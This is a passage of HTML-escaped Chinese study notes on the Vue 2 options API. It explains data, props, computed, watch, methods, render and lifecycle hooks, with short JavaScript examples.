&lt;p&gt;可以局部的引入混入实例&lt;br&gt;
&lt;code&gt;mixin.js&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;export const mymixin={
    data() {
        return {
            mymixinmessage:&#39;我是混入实例的数据&#39;
        }
    },
    created() {
        console.log(&#39;我是混入方法的钩子函数&#39;);
    },
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vue实例&lt;/p&gt;
&lt;p&gt;打印 &amp;quot;我是混入方法的钩子函数&amp;quot;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
    
{{mymixinmessage}} //我是混入实例的数据

  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
import {mymixin} from &#39;./mixin&#39;
export default {
    
    mixins:[mymixin],
   
}
&amp;lt;/script&amp;gt;

&amp;lt;style scoped&amp;gt;

&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vuecompile&#34;&gt;&lt;strong&gt;Vue.compile&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{String} template&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;将一个模板字符串编译成render函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var res = Vue.compile(&#39;&amp;lt;div&amp;gt;&amp;lt;span&amp;gt;{{ msg }}&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;&#39;)new Vue({  data: {    msg: &#39;hello&#39;  },  render: res.render,  staticRenderFns: res.staticRenderFns})
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vueobservable&#34;&gt;&lt;strong&gt;Vue.observable&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{Object} object&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;让一个对象可响应。Vue内部会用它来处理&lt;code&gt;data&lt;/code&gt;函数返回的对象&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用于组件状态共享&lt;/strong&gt;，可以注册至全局，也可以单独文件内容引入使用。&lt;/p&gt;
&lt;p&gt;返回的对象可以直接用于&lt;strong&gt;渲染函数&lt;/strong&gt;和&lt;strong&gt;计算属性&lt;/strong&gt;，并且会在发生变更时触发相应的更新。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const state = Vue.observable({ 	count: 0 })const Demo = {  render(h) {    return h(&#39;button&#39;, {      on: { click: () =&amp;gt; { state.count++ }}    }, `count is: ${state.count}`)  }}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;数据&#34;&gt;数据&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;data&#34;&gt;&lt;strong&gt;data&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;Object | Function&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;限制：组件的定义只接受&lt;code&gt;function&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;h4 id=&#34;响应式&#34;&gt;响应式&lt;/h4&gt;
&lt;p&gt;data里面的property会被&lt;code&gt;Object.defineProperty&lt;/code&gt;转化为getter/setter，来保证data里面property能够响应式变化。&lt;/p&gt;
&lt;p&gt;一旦被&lt;code&gt;watch&lt;/code&gt;函数观察过后无法直接在根数据上添加响应式数据。&lt;/p&gt;
&lt;p&gt;可以通过&lt;code&gt;Vue.set(object,propertyName,value)&lt;/code&gt;来添加响应式数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对象的property的添加和删除&lt;/strong&gt;是无法检测的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数组的直接利用索引改变数组项和修改数组长度&lt;/strong&gt;Vue都是不能检测到的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var vm = new Vue({  data: {    items: [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]  }})vm.items[1] = &#39;x&#39; // 不是响应性的vm.items.length = 2 // 不是响应性的
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于数组可以直接用数组的方法去修改，Vue对数组的方法进行了重写，&lt;/p&gt;
&lt;h4 id=&#34;dom操作&#34;&gt;DOM操作&lt;/h4&gt;
&lt;p&gt;Vue在更新Dom是异步的。对于数据更改后的DOM操作可以放在&lt;code&gt;nextTick里面进行&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;example&amp;quot;&amp;gt;{{message}}&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var vm = new Vue({  el: &#39;#example&#39;,  data: {    message: &#39;123&#39;  }})vm.message = &#39;new message&#39; // 更改数据vm.$el.textContent === &#39;new message&#39; // falseVue.nextTick(function () {  vm.$el.textContent === &#39;new message&#39; // true})
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;data为什么是函数形式&#34;&gt;Data为什么是函数形式&lt;/h4&gt;
&lt;p&gt;当一个&lt;strong&gt;组件&lt;/strong&gt;被定义，&lt;code&gt;data&lt;/code&gt; 必须声明为返回一个初始数据对象的函数，因为组件可能被用来创建多个实例。如果 &lt;code&gt;data&lt;/code&gt; 仍然是一个纯粹的对象，则所有的实例将&lt;strong&gt;共享引用&lt;/strong&gt;同一个数据对象！&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;props&#34;&gt;&lt;strong&gt;props&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;Array&amp;lt;string&amp;gt; | Object&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;props 可以是数组或对象，用于接收来自父组件的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可配置值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;type&lt;/code&gt;：可以是下列原生构造函数中的一种：&lt;code&gt;String&lt;/code&gt;、&lt;code&gt;Number&lt;/code&gt;、&lt;code&gt;Boolean&lt;/code&gt;、&lt;code&gt;Array&lt;/code&gt;、&lt;code&gt;Object&lt;/code&gt;、&lt;code&gt;Date&lt;/code&gt;、&lt;code&gt;Function&lt;/code&gt;、&lt;code&gt;Symbol&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dafault&lt;/code&gt;：默认值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;required&lt;/code&gt;：&lt;code&gt;Boolean&lt;/code&gt;，定义改prop是否是必填项&lt;/li&gt;
&lt;li&gt;&lt;code&gt;validator&lt;/code&gt;：&lt;code&gt;Function&lt;/code&gt;，自定义验证函数会将prop作为唯一参数传入。不符合&lt;code&gt;return&lt;/code&gt;条件就抛错&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;propsdata&#34;&gt;&lt;strong&gt;propsData&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;{[key:string]: any}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;限制：只能用于&lt;code&gt;new&lt;/code&gt;创建的实例中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;创建实例时传递props。主要作用时方便测试&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var Comp = Vue.extend({  props: [&#39;msg&#39;],  template: &#39;&amp;lt;div&amp;gt;{{ msg }}&amp;lt;/div&amp;gt;&#39;})var vm = new Comp({  propsData: {    msg: &#39;hello&#39;  }})
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;computed&#34;&gt;&lt;strong&gt;computed&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;{ [key:string]:Function | {get :Function ,set: Function}}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;注意如果为一个计算属性使用了箭头函数，则 &lt;code&gt;this&lt;/code&gt; 不会指向这个组件的实例，不过仍然可以将其实例作为函数的第一个参数来访问。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;computed: {  aDouble: vm =&amp;gt; vm.a * 2}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;计算属性的结果会被缓存，除非依赖的响应式 property 变化才会重新计算。&lt;/p&gt;
&lt;p&gt;如果某个依赖 (比如非响应式 property) 在该实例范畴之外，则计算属性是&lt;strong&gt;不会&lt;/strong&gt;被更新的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var vm = new Vue({  data: { a: 1 },  computed: {    // 仅读取    aDouble: function () {      return this.a * 2    },    // 读取和设置    aPlus: {      get: function () {        return this.a + 1      },      set: function (v) {        this.a = v - 1      }    }  }})vm.aPlus   // =&amp;gt; 2vm.aPlus = 3vm.a       // =&amp;gt; 2vm.aDouble // =&amp;gt; 4
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;watch&#34;&gt;&lt;strong&gt;watch&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;{ [key:string]:string |Function |Object |Array}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;一个对象，键是需要观察的表达式，值是对应回调函数。值也可以是方法名，或者包含选项的对象。Vue 实例将会在实例化时调用 &lt;code&gt;$watch()&lt;/code&gt;，遍历 watch 对象的每一个 property。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var vm = new Vue({
  data: {
    a: 1,
    b: 2,
    c: 3,
    d: 4,
    e: {
      f: {
        g: 5
      }
    }
  },
  watch: {
    a: function (val, oldVal) {
      console.log(&#39;new: %s, old: %s&#39;, val, oldVal)
    },
      
    // 方法名
    b: &#39;someMethod&#39;,
      
    // 该回调会在任何被侦听的对象的 property 改变时被调用，不论其被嵌套多深
    c: {
      handler: function (val, oldVal) { /* ... */ },
      deep: true
    },
      
    // 该回调将会在侦听开始之后被立即调用
    d: {
      handler: &#39;someMethod&#39;,
      immediate: true
    },
      
    // 你可以传入回调数组，它们会被逐一调用
    e: [
      &#39;handle1&#39;,
      function handle2 (val, oldVal) { /* ... */ },
      {
        handler: function handle3 (val, oldVal) { /* ... */ },
        /* ... */
      }
    ],
      
    // watch vm.e.f&#39;s value: {g: 5}
    &#39;e.f&#39;: function (val, oldVal) { /* ... */ }
  }
})
vm.a = 2 // =&amp;gt; new: 2, old: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;属性：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;handler&lt;/code&gt;：回调函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;deep&lt;/code&gt;：深度监听，当监听对象的时候，里面数据的变化也能触发函数，deep无法监听到数组的变动和对象的新增，只有以响应式的方式触发才会被监听到。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;immediate&lt;/code&gt;：是否初始化的时候执行handler的函数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注意：不应该使用箭头函数。箭头函数绑定的是父级作用域的上下文，所以&lt;code&gt;this&lt;/code&gt;将不会按照期望指向Vue实例。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;methods&#34;&gt;&lt;strong&gt;methods&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;{ [key:string] :Function}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;methods 将被混入到 Vue 实例中。可以直接通过 VM 实例访问这些方法，或者在指令表达式中使用。方法中的 &lt;code&gt;this&lt;/code&gt; 自动绑定为 Vue 实例。&lt;/p&gt;
&lt;!--也不要用箭头函数去写函数，对象里面的this指向会因为箭头函数而不指向对象里面的属性--&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var vm = new Vue({  data: { a: 1 },  methods: {    plus: function () {      this.a++    }  }})vm.plus()vm.a // 2
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;三者区别&#34;&gt;&lt;strong&gt;三者区别&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;methods和computed&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;理论上&lt;code&gt;computed&lt;/code&gt;能实现的&lt;code&gt;methods&lt;/code&gt;也能实现&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var app = new Vue({  el: &#39;#app&#39;,  data: {    a:&#39;fan&#39;,  },  computed:{    getmya:function(){      return this.a +&amp;quot;fan&amp;quot;    }  },  methods: {    getmya2(){      return this.a+&amp;quot;fan&amp;quot;    }  },})
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt; &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;       {{ getmya }}  &amp;lt;!--fanfan--&amp;gt;       {{getmya2()}} &amp;lt;!--fanfan--&amp;gt; &amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但重点在于&lt;code&gt;computed&lt;/code&gt;有缓存，如果结果不变化就返回缓存结果&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;computed: {  now: function () {    return Date.now()  }}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样，上面的计算属性也不会更新，因为&lt;code&gt;Date.now()&lt;/code&gt;不是响应式依赖&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;computed&lt;/code&gt;和&lt;code&gt;watch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;computed&lt;/code&gt;支持缓存，只有依赖数据改变，才会触发重新计算，&lt;code&gt;watch&lt;/code&gt;对应&lt;code&gt;data&lt;/code&gt;或者&lt;code&gt;props&lt;/code&gt;里面的数据，数据变化就会触发操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;computed&lt;/code&gt;不支持异步，当&lt;code&gt;computed&lt;/code&gt;里面有异步操作时会失效，无法监听数据的变化 ， 而&lt;code&gt;watch&lt;/code&gt;支持异步&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;dom&#34;&gt;DOM&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;el&#34;&gt;&lt;strong&gt;el&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;string |Element&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;限制：只能用&lt;code&gt;new&lt;/code&gt;创建实例才生效&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。可以是 CSS 选择器，也可以是一个 HTMLElement 实例。&lt;/p&gt;
&lt;p&gt;在实例挂载之后，元素可以用 &lt;code&gt;vm.$el&lt;/code&gt; 访问。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;template&#34;&gt;&lt;strong&gt;template&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;string&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;一个字符串模板作为 Vue 实例的标识使用。模板将会&lt;strong&gt;替换&lt;/strong&gt;挂载的元素。挂载元素的内容都将被忽略，除非模板的内容有分发插槽。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;render&#34;&gt;&lt;strong&gt;render&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;类型：&lt;code&gt;(createElement:()=&amp;gt;VNode) =&amp;gt;VNode&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;字符串模板的代替方案，允许你发挥 JavaScript 最大的编程能力。该渲染函数接收一个 &lt;code&gt;createElement&lt;/code&gt; 方法作为第一个参数用来创建 &lt;code&gt;VNode&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;script&amp;gt;
var app = new Vue({
  el: &#39;#app&#39;,
  name:&#39;myrender&#39;,
render(h) {
  return h(&#39;p&#39;,{
    //DOM属性
    domProps:{
      innerHTML:&#39;render??&#39;  
    },
    //css
    style:{
      color:&#39;red&#39;
    },
    // 正常的 HTML 特性
  attrs: {
    id: &#39;firstP&#39;
  }, 
  })
},

})
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;选项生命周期钩子&#34;&gt;选项/生命周期钩子&lt;/h2&gt;
&lt;br&gt;
&lt;p&gt;生命周期图&lt;/p&gt;
&lt;img src=&#34;https://cn.vuejs.org/images/lifecycle.png&#34;&gt;
&lt;h3 id=&#34;beforecreate&#34;&gt;&lt;strong&gt;beforeCreate&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;在实例初始化之后,进行数据侦听和事件/侦听器的配置之前同步调用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;created&#34;&gt;&lt;strong&gt;created&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，且 &lt;code&gt;$el&lt;/code&gt; property 目前尚不可用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;beforemount&#34;&gt;&lt;strong&gt;beforeMount&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;在挂载开始之前被调用：相关的 &lt;code&gt;render&lt;/code&gt; 函数首次被调用。&lt;/p&gt;
&lt;p&gt;实例已完成以下的配置： 编译模板，把data里面的数据和模板生成html，完成了el和data 初始化，注意此时还没有挂在html到页面上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;该钩子在服务器端渲染期间不被调用。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;mounted&#34;&gt;&lt;strong&gt;mounted&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;实例被挂载后调用，这时 &lt;code&gt;el&lt;/code&gt; 被新创建的 &lt;code&gt;vm.$el&lt;/code&gt; 替换了。&lt;/p&gt;
&lt;p&gt;模板中的HTML渲染到HTML页面中&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mounted&lt;/code&gt; &lt;strong&gt;不会&lt;/strong&gt;保证所有的子组件也都被挂载完成。如果你希望等到整个视图都渲染完毕再执行某些操作，可以在 &lt;code&gt;mounted&lt;/code&gt; 内部使用 &lt;code&gt;vm.$nextTick&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;mounted: function () {  this.$nextTick(function () {    // 仅在整个视图都被渲染之后才会运行的代码  })}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;beforeupdate&#34;&gt;&lt;strong&gt;beforeUpdate&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;在数据发生改变后，DOM 被更新之前被调用。&lt;/p&gt;
&lt;p&gt;可以在该钩子中进一步地更改状态，不会触发附加地重渲染过程。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;updated&#34;&gt;&lt;strong&gt;updated&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;在数据更改导致的虚拟 DOM 重新渲染和更新完毕之后被调用。&lt;/p&gt;
&lt;p&gt;应该避免在此期间更改状态，因为这可能会导致更新无限循环&lt;/p&gt;
&lt;p&gt;&lt;code&gt;updated&lt;/code&gt; &lt;strong&gt;不会&lt;/strong&gt;保证所有的子组件也都被重新渲染完毕。如果你希望等到整个视图都渲染完毕，可以在 &lt;code&gt;updated&lt;/code&gt; 里使用 &lt;code&gt;vm.$nextTick&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;activated&#34;&gt;&lt;strong&gt;activated&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;被&lt;code&gt;keep-alive&lt;/code&gt;缓存的组件激活调用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;deactivated&#34;&gt;&lt;strong&gt;deactivated&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;被 keep-alive 缓存的组件失活时调用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;beforedestory&#34;&gt;&lt;strong&gt;beforeDestory&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;实例销毁之前调用。在这一步，实例仍然完全可用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;destroyed&#34;&gt;&lt;strong&gt;destroyed&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;实例销毁后调用。该钩子被调用后，对应 Vue 实例的所有指令都被解绑，所有的事件监听器被移除，所有的子实例也都被销毁。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;选项组合&#34;&gt;选项/组合&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;parent&#34;&gt;&lt;strong&gt;parent&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;指定已创建的实例之父实例，在两者之间建立父子关系。子实例可以用 &lt;code&gt;this.$parent&lt;/code&gt; 访问父实例，子实例被推入父实例的 &lt;code&gt;$children&lt;/code&gt; 数组中。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;节制地使用 &lt;code&gt;$parent&lt;/code&gt; 和 &lt;code&gt;$children&lt;/code&gt; - 它们的主要目的是作为访问组件的	应急方法。更推荐用 props 和 events 实现父子组件通信&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;mixin&#34;&gt;&lt;strong&gt;mixin&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;同上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var mixin = {
  created: function () { console.log(1) }
}
var vm = new Vue({
  created: function () { console.log(2) },
  mixins: [mixin]
})
// =&amp;gt; 1
// =&amp;gt; 2
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;extends&#34;&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;同上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var CompA = {   created: function () { console.log(1) }}// 在没有调用 `Vue.extend` 时候继承 CompAvar CompB = {  extends: CompA,  ...}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;provideinject&#34;&gt;&lt;strong&gt;provide/inject&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;详细&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;这对选项需要一起使用，&lt;strong&gt;允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在其上下游关系成立的时间里始终生效&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;provide&lt;/code&gt; 选项应该是一个对象或返回一个对象的函数。该对象包含可注入其子孙的 property。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;inject&lt;/code&gt; 选项应该是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个字符串数组，或&lt;/li&gt;
&lt;li&gt;一个对象，对象的 key 是本地的绑定名，value 是：
&lt;ul&gt;
&lt;li&gt;在可用的注入内容中搜索用的 key (字符串或 Symbol)，或&lt;/li&gt;
&lt;li&gt;一个对象，该对象的：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;from&lt;/code&gt; property 是在可用的注入内容中搜索用的 key (字符串或 Symbol)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;default&lt;/code&gt; property 是降级情况下使用的 value&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;provide&lt;/code&gt; 和 &lt;code&gt;inject&lt;/code&gt; 绑定并不是可响应的。然而，如果你传入了一个可监听的对象，那么其对象的 property 还是可响应的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 父级组件提供 &#39;foo&#39;var Provider = {  provide: {    foo: &#39;bar&#39;  },  // ...}// 子组件注入 &#39;foo&#39;var Child = {  inject: [&#39;foo&#39;],  created () {    console.log(this.foo) // =&amp;gt; &amp;quot;bar&amp;quot;  }  // ...}
